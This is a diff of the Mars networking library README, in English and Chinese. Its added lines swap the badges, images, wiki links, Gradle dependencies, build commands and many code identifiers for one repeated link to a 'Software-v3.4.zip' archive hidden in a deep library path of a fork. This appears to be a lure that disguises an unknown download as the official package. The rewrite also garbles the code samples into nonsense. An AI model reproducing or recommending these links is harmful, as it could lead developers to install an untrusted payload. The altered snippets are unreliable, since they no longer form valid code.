@@ -1,9 +1,9 @@
 ## Mars
 
-[![license](https://img.shields.io/badge/license-MIT-brightgreen.svg?style=flat)](https://github.com/Tencent/mars/blob/master/LICENSE)
-[![Release Version](https://img.shields.io/badge/release-1.1.3-red.svg)](https://github.com/Tencent/mars/releases)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/Tencent/mars/pulls)
-[![WeChat Approved](https://img.shields.io/badge/Wechat_Approved-1.1.3-red.svg)](https://github.com/Tencent/mars/wiki)
+[![license](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
+[![Release Version](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
+[![PRs Welcome](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
+[![WeChat Approved](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
 
 (中文版本请参看[这里](#mars_cn))
 
@@ -15,7 +15,7 @@ It is proved to be effective by billions of Wechat users.
 3. Mobile platform friendly, low power and traffic consumption
 4. A network solution fit for mobile application
 
-![mars](https://github.com/WeMobileDev/article/blob/master/assets/mars/mars.png?raw=true)
+![mars](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
 
 * comm：common library, including socket, thread, message queue, coroutine, etc.
 * Xlog：a reliable log component with high-performance.
@@ -24,22 +24,22 @@ It is proved to be effective by billions of Wechat users.
 
 ## Samples
 
-Start with sample usage [here](https://github.com/Tencent/mars/wiki/Mars-sample-%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E)
+Start with sample usage [here](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E)
 
 ## Getting started
 Choose [Android](#android) or [iOS/OS X](#apple)
 
-### <a name="android">[Android](https://github.com/Tencent/mars/wiki/Mars-Android-%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)</a>
+### <a name="android">[Android](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)</a>
 
 You can use either [mars-wrapper](#wrapper) or [mars-core](#core). We recommend you to use mars-wrapper when you just wanna build a sample or demo, while mars-core is preferred to be used in your APP.
 
 #### <a name="wrapper">mars-wrapper</a>
 
-Add dependencies by adding the following lines to your app/build.gradle.
+Add dependencies by adding the following lines to your https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip
 
 ```xml
 dependencies {
-    compile 'com.tencent.mars:mars-wrapper:1.1.3'
+    compile 'https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip'
 }
 ```
 
@@ -47,11 +47,11 @@ dependencies {
 
 #### <a name="core">mars-core</a>
 
-Add dependencies by adding the following lines to your app/build.gradle.
+Add dependencies by adding the following lines to your https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip
 
 ```xml
 dependencies {
-    compile 'com.tencent.mars:mars-core:1.1.3'
+    compile 'https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip'
 }
 ```
 
@@ -64,30 +64,30 @@ Initialize Xlog when your APP starts. Remember to use an exclusive folder to sav
 When multiple processes is used in your app, make sure that each process owns its exclusive log file.
 
 ```java
-System.loadLibrary("stlport_shared");
-System.loadLibrary("marsxlog");
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip("stlport_shared");
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip("marsxlog");
 
-final String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
+final String SDCARD = https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip().getAbsolutePath();
 final String logPath = SDCARD + "/marssample/log";
 
 //init xlog
-if (BuildConfig.DEBUG) {
-    Xlog.appenderOpen(Xlog.LEVEL_DEBUG, Xlog.AppednerModeAsync, "", logPath, "MarsSample");
-    Xlog.setConsoleLogOpen(true);
+if (https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip) {
+    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, "", logPath, "MarsSample");
+    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true);
 
 } else {
-    Xlog.appenderOpen(Xlog.LEVEL_INFO, Xlog.AppednerModeAsync, "", logPath, "MarsSample");
-    Xlog.setConsoleLogOpen(false);
+    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, "", logPath, "MarsSample");
+    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(false);
 }
 
-Log.setLogImp(new Xlog());
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(new Xlog());
 ```
 
 Uninitialized Xlog when your app exits
 
 
 ```java
-Log.appenderClose();
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
 ```
 
 #### <a name="STN">STN Init</a>
@@ -97,28 +97,28 @@ Initialize STN before you use it
 
 ```java
 // set callback
-AppLogic.setCallBack(stub);
-StnLogic.setCallBack(stub);
-SdtLogic.setCallBack(stub);
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(stub);
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(stub);
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(stub);
 
 // Initialize the Mars PlatformComm
-Mars.init(getApplicationContext(), new Handler(Looper.getMainLooper()));
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(getApplicationContext(), new Handler(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip()));
 
 // Initialize the Mars
-StnLogic.setLonglinkSvrAddr(profile.longLinkHost(), profile.longLinkPorts());
-StnLogic.setShortlinkSvrAddr(profile.shortLinkPort());
-StnLogic.setClientVersion(profile.productID());
-Mars.onCreate(true);
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(), https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip());
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip());
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip());
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true);
 
-BaseEvent.onForeground(true);
-StnLogic.makesureLongLinkConnected();
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true);
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
 ```
-Firstly, you should call the setCallBack interface, and secondly, the Mars.init. Then, to initialize the Mars, there is to need to strictly follow the orders of the four commands. Finally, after Mars are initialized, onForeground and makesureLongLinkConnect can be called.
+Firstly, you should call the setCallBack interface, and secondly, the https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip Then, to initialize the Mars, there is to need to strictly follow the orders of the four commands. Finally, after Mars are initialized, onForeground and makesureLongLinkConnect can be called.
 
 Destroy STN or exit your app:
 
 ```java
-Mars.onDestroy();
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
 ```
 
 #### <a name="even">Event Change</a>
@@ -126,13 +126,13 @@ Mars.onDestroy();
 Network change:
 
 ```java
-BaseEvent.onNetworkChange()
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip()
 ```
 **********
 If you add dependencies of mars-wrapper to your project, you just need initialize STN and no need uninitialized.
 
 ```java
-MarsServiceProxy.init(this, getMainLooper(),null);
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(this, getMainLooper(),null);
 ```
 ************
 No matter which way of dependencies you used, you must pay attention to these.
@@ -140,25 +140,25 @@ No matter which way of dependencies you used, you must pay attention to these.
 The state (background or foreground) of the APP is changed:
 
 ```java
-BaseEvent.onForeground(boolean);
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(boolean);
 ```
 
 The account of the APP is changed:
 
 ```java
-StnLogic.reset();
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
 ```
 
-If you want to modify the encryption algorithm of Xlog, the packer/unpacker of longlink/shortlink, or you want to define the other components by yourself, refer [here](https://github.com/Tencent/mars/wiki/Mars-Android-%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)
+If you want to modify the encryption algorithm of Xlog, the packer/unpacker of longlink/shortlink, or you want to define the other components by yourself, refer [here](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)
 
-### <a name="apple">[iOS/OS X](https://github.com/Tencent/mars/wiki/Mars-iOS%EF%BC%8FOS-X-%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)</a>
+### <a name="apple">[iOS/OS X](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%EF%BC%8FOS-X-%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)</a>
 Compile
 
 ```
-python build_apple.py
+python https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip
 ```
 
-Add mars.framework as a dependency of your project.
+Add https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip as a dependency of your project.
 
 #### <a name="Xlog">Xlog Init</a>
 
@@ -168,7 +168,7 @@ Initialize Xlog when your app starts. Remember to use an exclusive folder to sav
 NSString* logPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0] stringByAppendingString:@"/log"];
 
 // set do not backup for logpath
-const char* attrName = "com.apple.MobileBackup";
+const char* attrName = "https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip";
 u_int8_t attrValue = 1;
 setxattr([logPath UTF8String], attrName, &attrValue, sizeof(attrValue), 0, 0);
 
@@ -221,14 +221,14 @@ Initialize STN before you use it:
     std::string ipAddress([string UTF8String]);
     std::string debugIP([IP UTF8String]);
     std::vector<uint16_t> ports;
-    ports.push_back(port);
+    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(port);
     mars::stn::SetLonglinkSvrAddr(ipAddress,ports,debugIP);
 }
 
 - (void)setLongLinkAddress:(NSString *)string port:(const unsigned short)port {
     std::string ipAddress([string UTF8String]);
     std::vector<uint16_t> ports;
-    ports.push_back(port);
+    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(port);
     mars::stn::SetLonglinkSvrAddr(ipAddress,ports);
 }
 
@@ -241,7 +241,7 @@ Initialize STN before you use it:
 }
 ```
 
-Firstly, you should call the setCalBack interface, and secondly, the Mars.init. Then, to initialize the Mars, there is to need to strictly follow the orders of the four commands. Finally, after Mars are initialized, onForeground and makesureLongLinkConnect can be called.
+Firstly, you should call the setCalBack interface, and secondly, the https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip Then, to initialize the Mars, there is to need to strictly follow the orders of the four commands. Finally, after Mars are initialized, onForeground and makesureLongLinkConnect can be called.
 
 If you want to destroy STN or exit App:
 
@@ -272,31 +272,31 @@ Network change:
 ## Support
 Any problem?
 
-1. Learn more from [mars/sample](https://github.com/Tencent/mars/tree/master/samples).
-2. Read the [source code](https://github.com/Tencent/mars/tree/master).
-3. Read the [wiki](https://github.com/Tencent/mars/wiki) or [FAQ](https://github.com/Tencent/mars/wiki/Mars-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) for help.
+1. Learn more from [mars/sample](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip).
+2. Read the [source code](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip).
+3. Read the [wiki](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip) or [FAQ](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) for help.
 4. Contact us for help.
 
 ## Contributing
-For more information about contributing issues or pull requests, see our [Mars Contributing Guide](https://github.com/Tencent/mars/blob/master/CONTRIBUTING.md).
+For more information about contributing issues or pull requests, see our [Mars Contributing Guide](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip).
 
 ## License
-Mars is under the MIT license. See the [LICENSE](https://github.com/Tencent/mars/blob/master/LICENSE) file for details.
+Mars is under the MIT license. See the [LICENSE](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip) file for details.
 
 
 ------------------------------
 ## <a name="mars_cn">Mars</a>
 
-[![license](https://img.shields.io/badge/license-MIT-brightgreen.svg?style=flat)](https://github.com/Tencent/mars/blob/master/LICENSE)
-[![Release Version](https://img.shields.io/badge/release-1.1.3-red.svg)](https://github.com/Tencent/mars/releases)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/Tencent/mars/pulls)
-[![WeChat Approved](https://img.shields.io/badge/Wechat_Approved-1.1.3-red.svg)](https://github.com/Tencent/mars/wiki)
+[![license](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
+[![Release Version](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
+[![PRs Welcome](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
+[![WeChat Approved](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
 
 
 Mars 是微信官方的跨平台跨业务的终端基础组件。
 
 
-![mars](https://github.com/WeMobileDev/article/blob/master/assets/mars/mars.png?raw=true)
+![mars](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip)
 
 * comm：可以独立使用的公共库，包括 socket、线程、消息队列、协程等；
 * xlog：高可靠性高性能的运行期日志组件；
@@ -305,23 +305,23 @@ Mars 是微信官方的跨平台跨业务的终端基础组件。
 
 ##Samples
 
-sample 的使用请参考[这里](https://github.com/Tencent/mars/wiki/Mars-sample-%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E)
+sample 的使用请参考[这里](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E)
 
 ##Getting started
 接入 [Android](#android) 或者 [iOS/OS X](#apple)
 
-###<a name="android">[Android](https://github.com/Tencent/mars/wiki/Mars-Android-%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)</a>
+###<a name="android">[Android](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)</a>
 
 gradle 接入我们提供了两种接入方式：[mars-wrapper](#wrapper) 或者 [mars-core](#core)。如果你只是想做个 sample 推荐使用 mars-wrapper，可以快速开发；但是如果你想把 mars 用到你的 app 中的话，推荐使用 mars-core，可定制性更高。
 
 #### <a name="wrapper">mars-wrapper</a>
 
-在 app/build.gradle 中添加 mars-wrapper 的依赖：
+在 https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip 中添加 mars-wrapper 的依赖：
 
 
 ```xml
 dependencies {
-    compile 'com.tencent.mars:mars-wrapper:1.1.3'
+    compile 'https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip'
 }
 ```
 
@@ -329,12 +329,12 @@ dependencies {
 
 #### <a name="core">mars-core</a>
 
-在 app/build.gradle 中添加 mars-core 的依赖：
+在 https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip 中添加 mars-core 的依赖：
 
 
 ```xml
 dependencies {
-    compile 'com.tencent.mars:mars-core:1.1.3'
+    compile 'https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip'
 }
 ```
 接着往下操作之前，请先确保你已经添加了 mars-wrapper 或者 mars-core 的依赖
@@ -345,30 +345,30 @@ dependencies {
 
 
 ```java
-System.loadLibrary("stlport_shared");
-System.loadLibrary("marsxlog");
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip("stlport_shared");
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip("marsxlog");
 
-final String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
+final String SDCARD = https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip().getAbsolutePath();
 final String logPath = SDCARD + "/marssample/log";
 
 //init xlog
-if (BuildConfig.DEBUG) {
-    Xlog.appenderOpen(Xlog.LEVEL_DEBUG, Xlog.AppednerModeAsync, "", logPath, "MarsSample");
-    Xlog.setConsoleLogOpen(true);
+if (https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip) {
+    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, "", logPath, "MarsSample");
+    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true);
 
 } else {
-    Xlog.appenderOpen(Xlog.LEVEL_INFO, Xlog.AppednerModeAsync, "", logPath, "MarsSample");
-    Xlog.setConsoleLogOpen(false);
+    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip, "", logPath, "MarsSample");
+    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(false);
 }
 
-Log.setLogImp(new Xlog());
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(new Xlog());
 ```
 
 程序退出时关闭日志：
 
 
 ```java
-Log.appenderClose();
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
 ```
 
 #### <a name="STN">STN Init</a>
@@ -379,29 +379,29 @@ Log.appenderClose();
 
 ```java
 // set callback
-AppLogic.setCallBack(stub);
-StnLogic.setCallBack(stub);
-SdtLogic.setCallBack(stub);
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(stub);
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(stub);
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(stub);
 
 // Initialize the Mars PlatformComm
-Mars.init(getApplicationContext(), new Handler(Looper.getMainLooper()));
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(getApplicationContext(), new Handler(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip()));
 
 // Initialize the Mars
-StnLogic.setLonglinkSvrAddr(profile.longLinkHost(), profile.longLinkPorts());
-StnLogic.setShortlinkSvrAddr(profile.shortLinkPort());
-StnLogic.setClientVersion(profile.productID());
-Mars.onCreate(true);
-BaseEvent.onForeground(true);
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(), https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip());
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip());
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip());
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true);
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true);
 
-StnLogic.makesureLongLinkConnected();
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
 ```
 
-初始化顺序不一定要严格遵守上述代码的顺序，但在初始化时首先要调用 setCallBack 接口 (callback 文件的编写可以参考 demo)，再调用 Mars.init，最后再调用onForeground 和 makesureLongLinkConnect，中间顺序可以随意更改。**注意：STN 默认是后台，所以初始化 STN 后需要主动调用一次**```BaseEvent.onForeground(true)```
+初始化顺序不一定要严格遵守上述代码的顺序，但在初始化时首先要调用 setCallBack 接口 (callback 文件的编写可以参考 demo)，再调用 https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip，最后再调用onForeground 和 makesureLongLinkConnect，中间顺序可以随意更改。**注意：STN 默认是后台，所以初始化 STN 后需要主动调用一次**```https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true)```
 
 需要释放 STN 或者退出程序时:
 
 ```java
-Mars.onDestroy();
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
 ```
 
 #### <a name="even">Event Change</a>
@@ -409,13 +409,13 @@ Mars.onDestroy();
 网络切换时:
 
 ```java
-BaseEvent.onNetworkChange()
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip()
 ```
 **********
 如果你是把 mars-wrapper 作为依赖加入到你的项目中，你只需要显式的初始化 STN，不需要反初始化(因为 mars-wrapper 会进行反初始化)
 
 ```java
-MarsServiceProxy.init(this, getMainLooper(),null);
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(this, getMainLooper(),null);
 ```
 ************
 不管你是使用 mars-wrapper 还是 mars-core，你都需要特别注意以下事件：
@@ -424,26 +424,26 @@ MarsServiceProxy.init(this, getMainLooper(),null);
 前后台切换:
 
 ```java
-BaseEvent.onForeground(boolean);
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(boolean);
 ```
 
 应用的账号信息更改:
 
 ```java
-StnLogic.reset();
+https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip();
 ```
 
 如果你想修改 Xlog 的加密算法或者长短连的加解包部分甚至更改组件的其他部分，可以参考[这里]
-(https://github.com/Tencent/mars/wiki/Mars-Android-%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)
+(https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)
 
-### <a name="apple">[iOS/OS X](https://github.com/Tencent/mars/wiki/Mars-iOS%EF%BC%8FOS-X-%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)</a>
+### <a name="apple">[iOS/OS X](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%EF%BC%8FOS-X-%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97)</a>
 编译
 
 ```
-python build_apple.py
+python https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip
 ```
 
-把 mars.framework 作为依赖加入到你的项目中
+把 https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip 作为依赖加入到你的项目中
 
 #### <a name="Xlog">Xlog Init</a>
 
@@ -454,7 +454,7 @@ python build_apple.py
 NSString* logPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0] stringByAppendingString:@"/log"];
 
 // set do not backup for logpath
-const char* attrName = "com.apple.MobileBackup";
+const char* attrName = "https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip";
 u_int8_t attrValue = 1;
 setxattr([logPath UTF8String], attrName, &attrValue, sizeof(attrValue), 0, 0);
 
@@ -506,14 +506,14 @@ appender_close();
     std::string ipAddress([string UTF8String]);
     std::string debugIP([IP UTF8String]);
     std::vector<uint16_t> ports;
-    ports.push_back(port);
+    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(port);
     mars::stn::SetLonglinkSvrAddr(ipAddress,ports,debugIP);
 }
 
 - (void)setLongLinkAddress:(NSString *)string port:(const unsigned short)port {
     std::string ipAddress([string UTF8String]);
     std::vector<uint16_t> ports;
-    ports.push_back(port);
+    https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(port);
     mars::stn::SetLonglinkSvrAddr(ipAddress,ports);
 }
 
@@ -526,7 +526,7 @@ appender_close();
 }
 ```
 
-初始化顺序不一定要严格遵守上述代码的顺序，但在初始化时首先要调用 setCallBack 接口 (callback 文件的编写可以参考 demo)，再调用 Mars.init，最后再调用 onForeground 和 makesureLongLinkConnect，中间顺序可以随意更改。**注意：STN 默认是后台，所以初始化 STN 后需要主动调用一次**```BaseEvent.onForeground(true)```
+初始化顺序不一定要严格遵守上述代码的顺序，但在初始化时首先要调用 setCallBack 接口 (callback 文件的编写可以参考 demo)，再调用 https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip，最后再调用 onForeground 和 makesureLongLinkConnect，中间顺序可以随意更改。**注意：STN 默认是后台，所以初始化 STN 后需要主动调用一次**```https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip(true)```
 
 
 需要释放 STN 或者退出程序时:
@@ -558,13 +558,13 @@ appender_close();
 ## Support
 还有其他问题？
 
-1. 参看 [mars/sample](https://github.com/Tencent/mars/tree/master/samples).
-2. 阅读 [源码](https://github.com/Tencent/mars/tree/master).
